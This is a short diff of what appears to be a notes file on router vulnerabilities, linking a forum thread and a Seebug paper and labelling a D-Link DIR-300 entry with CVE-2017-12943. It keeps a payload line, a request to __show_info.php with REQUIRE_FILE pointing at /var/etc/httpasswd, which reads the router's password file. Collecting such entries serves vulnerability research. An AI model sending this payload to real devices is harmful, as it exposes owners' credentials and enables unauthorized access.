@@ -3,9 +3,9 @@ https://www.52pojie.cn/thread-1572565-1-1.html#41264230_2%E3%80%81dir600
 https://paper.seebug.org/429/#d-link-dir-300-dir-320-dir-600-dir-615
 
 
-# D-Link DIR-300 
+# D-Link DIR-300   CVE-2017-12943
 
-__show_info_php
+show_info.php
 
 Payload `__show_info.php?REQUIRE_FILE=/var/etc/httpasswd`
 
